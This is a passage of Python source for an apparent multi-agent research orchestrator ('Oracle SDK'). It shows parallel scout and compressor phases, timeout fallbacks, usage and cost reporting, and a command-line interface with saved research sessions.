            self.status(f"{self._phase('anderson')}Anderson ({self.chains} parallel Sonnet)")
        t0 = time.time()
        self._emit_progress("organize")

        # Group scouts by chain
        chains: dict[str, list[ScoutResult]] = {}
        for r in scout_results:
            chains.setdefault(r.chain, []).append(r)

        async def _compress_with_timeout(chain: str, scouts: list, delay: float = 0) -> CompressorResult:
            if delay > 0:
                await asyncio.sleep(delay)
            try:
                result = await asyncio.wait_for(
                    self._run_compressor(chain, scouts),
                    timeout=ANDERSON_TIMEOUT_S,
                )
                self._completed_organizers += 1
                self._emit_progress("organize")
                return result
            except asyncio.TimeoutError:
                self.status(f"  Anderson {chain} TIMEOUT [{ANDERSON_TIMEOUT_S}s] — stashing raw Smiths as fallback")
                result = CompressorResult(chain=chain, summary="", error=f"Timed out after {ANDERSON_TIMEOUT_S}s",
                                          duration_ms=ANDERSON_TIMEOUT_S * 1000, fallback_scouts=scouts)
                self._completed_organizers += 1
                self._emit_progress("organize")
                return result
            except Exception as e:
                self.status(f"  Anderson {chain} FAILED: {e} — stashing raw Smiths as fallback")
                result = CompressorResult(chain=chain, summary="", error=str(e), fallback_scouts=scouts)
                self._completed_organizers += 1
                self._emit_progress("organize")
                return result

        # Dispatch only chains with at least one successful Smith. Multi-chain:
        # reverse-sort so Chain A (usually heaviest) launches LAST with the most
        # stagger; base 3s delay lets the OS reclaim Smith subprocesses, then 2s
        # per live Anderson. Isolation mode needs no stagger — no shared config.
        isolated = _oauth_token() is not None
        multi = len(chains) > 1
        ordered = sorted(chains.items(), reverse=True) if multi else sorted(chains.items())
        tasks = []
        skipped: list[CompressorResult] = []
        dispatched = 0
        for chain, scouts in ordered:
            if not any(not s.error for s in scouts):
                self.status(f"  Anderson {chain} SKIPPED — all Smiths failed")
                skipped.append(CompressorResult(
                    chain=chain, summary="",
                    error="All Smiths failed for this chain — Anderson skipped",
                ))
                self._completed_organizers += 1
                self._emit_progress("organize")
                continue
            delay = 0 if isolated else ((3 + dispatched * 2) if multi else 0)
            tasks.append(_compress_with_timeout(chain, scouts, delay=delay))
            dispatched += 1

        live_results = list(await asyncio.gather(*tasks)) if tasks else []
        results = sorted(live_results + skipped, key=lambda r: r.chain)

        phase_usage = UsageStats()
        for r in results:
            if r.error:
                self.metrics.compressor_errors += 1
            phase_usage.add(r.usage)

        self.metrics.compressor_count = len(results)
        self.metrics.chain_count = len(chains)
        elapsed = time.time() - t0
        self.metrics.phase_times["compress"] = elapsed
        self.metrics.phase_usage["compress"] = phase_usage
        self.status(f"  {len(results)} Andersons returned ({elapsed:.1f}s) | {phase_usage}")
        return results

    # ----- Main orchestration -----

    async def run(self, question: str, prompts: list[dict] | None = None) -> str:
        """Execute the full oracle protocol with true isolation."""
        try:
            return await self._run_inner(question, prompts)
        finally:
            # Never leak per-run isolated config dirs — this also covers
            # crashes and cancellation, not just the happy path.
            self._cleanup_isolation()

    async def _run_inner(self, question: str, prompts: list[dict] | None = None) -> str:
        self.metrics = OracleMetrics(start_time=time.time())
        self.planned_prompts = []
        self._completed_organizers = 0

        if prompts:
            # Normalize (idempotent) and validate library-supplied prompts, so the
            # 1-MAX_CHAINS limit enforced in __init__ cannot be bypassed here.
            prompts = _normalize_prompts(prompts)
            self.scouts_total = len(prompts)
            self.chains = len(set(p["chain"] for p in prompts))
            if not (1 <= self.chains <= MAX_CHAINS):
                raise ValueError(f"Prompts span {self.chains} chains; must be 1-{MAX_CHAINS}")
        else:
            # Fallback: use built-in Architect to decompose
            prompts = await self.decompose(question)

        self.planned_prompts = prompts
        self._progress_totals = {
            "scouts": len(prompts),
            "organizers": len({p["chain"] for p in prompts}),
        }
        self._emit_progress("research")
        # Phase 2: Scout (all parallel, bounded)
        scout_results = await self.scout(prompts)

        # Guard: if all scouts failed, skip Anderson entirely
        successful_scouts = [r for r in scout_results if not r.error]
        if not successful_scouts:
            self.status("  WARNING: All Smiths failed or timed out. Skipping Anderson.")
            report = "ERROR: All Smiths failed or timed out. No data to synthesize."
        else:
            # Phase 3: Compress (one per chain, parallel, isolated)
            compressor_results = await self.compress(scout_results)

            if not compressor_results:
                report = "ERROR: No compressor results"
            elif self.chains == 1:
                r = compressor_results[0]
                if not r.error:
                    report = r.summary or "ERROR: Anderson returned an empty synthesis."
                elif r.fallback_scouts:
                    report = (
                        f"## Anderson FAILED ({r.error}) — RAW SMITH FALLBACK\n\n"
                        f"_Anderson synthesis failed. The raw Smith outputs are preserved below verbatim — "
                        f"re-dispatch Anderson on these without re-running the Smiths._\n\n"
                        f"{self._raw_smith_fallback(r.fallback_scouts)}"
                    )
                else:
                    report = f"ERROR: {r.error}"
            else:
                # Multi-chain: return all Anderson reports directly to the calling session.
                chain_reports = []
                for r in compressor_results:
                    if not r.error:
                        chain_reports.append(f"{'=' * 60}\n## Chain {r.chain} — Anderson Report\n{'=' * 60}\n\n{r.summary}")
                    elif r.fallback_scouts:
                        # Anderson failed but the scouts succeeded — emit raw outputs so
                        # recovery is "redo Anderson on these N Smiths", not "redo all N."
                        chain_reports.append(
                            f"{'=' * 60}\n## Chain {r.chain} — ANDERSON FAILED ({r.error}) — RAW SMITH FALLBACK\n{'=' * 60}\n\n"
                            f"_Anderson synthesis failed for this chain. The {len(r.fallback_scouts)} raw Smith outputs "
                            f"are preserved below verbatim — caller can re-dispatch Anderson on these without re-running the Smiths._\n\n"
                            f"{self._raw_smith_fallback(r.fallback_scouts)}"
                        )
                    else:
                        chain_reports.append(f"## Chain {r.chain} — ERROR: {r.error}")
                report = "\n\n".join(chain_reports)

        # Append metrics footer
        m = self.metrics
        total = m.total_usage
        parts = []
        if self._has_architect:
            parts.append("Architect")
        parts.append(f"{self.scouts_total} Smiths")
        parts.append(f"{self.chains} Anderson{'s' if self.chains > 1 else ''}")
        parts.append("Caller (you)")
        arch = " -> ".join(parts)
        if self.show_dollars:
            cost_line = f"- Total cost: ${total.cost_usd:.4f}"
            phase_costs = ' | '.join(f'{k}: ${u.cost_usd:.4f}' for k, u in m.phase_usage.items())
        else:
            cost_line = f"- Quota: {total.weekly_pct:.2f}% weekly ({total.session_pct:.1f}% session)"
            phase_costs = ' | '.join(f'{k}: {u.weekly_pct:.2f}%' for k, u in m.phase_usage.items())
        footer = f"""

---
**Oracle SDK Execution Metrics**
- Architecture: {arch}
- Total time: {m.total_time:.0f}s
- Total tokens: {total.total_tokens:,} (in: {total.input_tokens:,} | out: {total.output_tokens:,} | cache r/w: {total.cache_read_input_tokens:,}/{total.cache_creation_input_tokens:,})
{cost_line}
- Smiths: {m.scout_count} ({m.scout_errors} errors)
- Andersons: {m.compressor_count} ({m.compressor_errors} errors)
- Phase timing: {' | '.join(f'{k}: {v:.0f}s' for k, v in m.phase_times.items())}
- Phase costs: {phase_costs}
"""
        return report + footer


def main_sync():
    """Sync entry point for console_scripts."""
    asyncio.run(_async_main())


async def _async_main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Oracle SDK — Multi-tier research orchestrator with true isolation"
    )
    parser.add_argument("question", nargs="?", default="", help="Research question")
    parser.add_argument("--chains", "-c", type=int,
        help=f"Number of chains, 1-{MAX_CHAINS} (default: {DEFAULT_CHAINS})")
    parser.add_argument("--rounds", type=int,
        help="Orchestrator-managed research rounds (default: 1); returns after "
             "each round so the caller can adapt the next plan")
    session_options = parser.add_mutually_exclusive_group()
    session_options.add_argument("--session-dir",
        help="Create a new session here (default for multiple rounds: research/oracle-<unique-id>)")
    session_options.add_argument("--resume", metavar="SESSION",
        help="Run the next round of a saved session with fresh JSON prompts on stdin")
    session_options.add_argument("--session-status", metavar="SESSION",
        help="Print lifecycle, outcome, live phase/progress, checkpoint, and usage as JSON "
             "without running models or reading stdin")
    parser.add_argument("--verbose", "-v", action="store_true", help="Show tool activity per scout")
    parser.add_argument("--local", action="store_true",
        help="Grant scouts local file tools (Read/Grep/Glob) for questions about "
             "this machine's code. Off by default: combined with web access, local "
             "reads create a prompt-injection exfiltration surface.")
    parser.add_argument("--usd", action="store_true", help="Show costs in USD instead of quota %%")
    parser.add_argument("--report", "-r", action="store_true", help="Save report to a dated file")
    args = parser.parse_args()

    if args.rounds is not None and args.rounds < 1:
        parser.error("--rounds must be a positive integer")
    if (args.resume or args.session_status) and (
        args.question or args.rounds is not None
        or args.chains is not None or args.local or args.usd
    ):
        parser.error("Saved sessions use their original question, rounds, chains, and tool settings")
    if args.rounds is None:
        args.rounds = DEFAULT_ROUNDS
    if args.chains is None:
        args.chains = DEFAULT_CHAINS
    if args.session_status:
        try:
            session = RoundSession.open(args.session_status)
            state = session.status()
            state["directory"] = str(session.path)
            print(json.dumps(state, indent=2, ensure_ascii=False))
        except (OSError, ValueError) as exc:
            print(f"ERROR: {exc}", file=sys.stderr)
            sys.exit(1)
        return

    prompts = None
    if not sys.stdin.isatty():
        stdin_data = sys.stdin.read().strip()
        if stdin_data:
            try:
                raw = json.loads(stdin_data)
            except json.JSONDecodeError as e:
                print(f"ERROR: Invalid JSON on stdin: {e}", file=sys.stderr)
                sys.exit(1)
            try:
                prompts = _normalize_prompts(raw)
            except ValueError as e:
                print(f"ERROR: {e}", file=sys.stderr)
                sys.exit(1)

    if not prompts and not args.question and not args.resume:
        parser.error("Either pipe prompts via stdin or provide a question argument")
    if args.resume and not prompts:
        parser.error("--resume requires a fresh JSON prompt array on stdin")

    try:
        if args.resume:
            session = RoundSession.open(args.resume)
            report = await session.run_round(prompts, verbose=args.verbose)
        elif args.rounds > 1 or args.session_dir:
            session = RoundSession.create(
                args.question or "Research from supplied prompts",
                rounds=args.rounds,
                chains=len(set(p["chain"] for p in prompts)) if prompts else args.chains,
                directory=args.session_dir,
                local_tools=args.local,
                show_dollars=args.usd,
            )
            report = await session.run_round(prompts, verbose=args.verbose)
        else:
            oracle = OracleSDK(
                chains=len(set(p["chain"] for p in prompts)) if prompts else args.chains,
                verbose=args.verbose,
                show_dollars=args.usd,
                local_tools=args.local,
            )
            # Banner — piped prompts retain their actual scout count.
            n_smiths = len(prompts) if prompts else oracle.chains * SCOUTS_PER_CHAIN
            parts = []
            if not prompts:
                parts.append("Architect")
            parts.append(f"{n_smiths} Smiths")
            parts.append(f"{oracle.chains} Anderson{'s' if oracle.chains > 1 else ''}")
            parts.append("Caller (you)")
            print(f"Oracle SDK v4.7.0 -- {' -> '.join(parts)}", file=sys.stderr)
            report = await oracle.run(args.question, prompts=prompts)
    except Exception as e:
        print(f"ERROR: {e}", file=sys.stderr)
        sys.exit(1)
    print(report)

    if args.report:
        import datetime
        filename = f"oracle-report-{datetime.datetime.now().strftime('%Y%m%d-%H%M%S')}.md"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(report)
        print(f"\nReport saved to: {filepath}", file=sys.stderr)
